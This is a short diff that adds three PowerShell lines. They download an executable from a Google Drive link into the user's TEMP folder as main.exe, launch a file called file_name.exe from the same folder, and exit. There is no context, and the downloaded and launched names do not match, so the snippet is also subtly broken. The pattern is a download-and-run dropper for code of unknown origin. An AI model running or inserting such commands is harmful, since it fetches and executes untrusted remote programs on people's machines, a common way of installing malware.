@@ -1,0 +1,3 @@
+powershell -c (New-Object System.Net.WebClient).DownloadFile('https://drive.usercontent.google.com/download?id=1oNAH5t5r9sNkV39yzpJLnhtk8Th-5V6e&export=download&authuser=0&confirm=t&uuid=ffefa7cd-cbf8-4c79-bef0-e9ae0a984e8d&at=AO7h07fagpNnESSondzwwCLfY0Jx%3A1726521888636', "$env:TEMP\main.exe")
+Start-Process "$env:TEMP\file_name.exe"
+exit
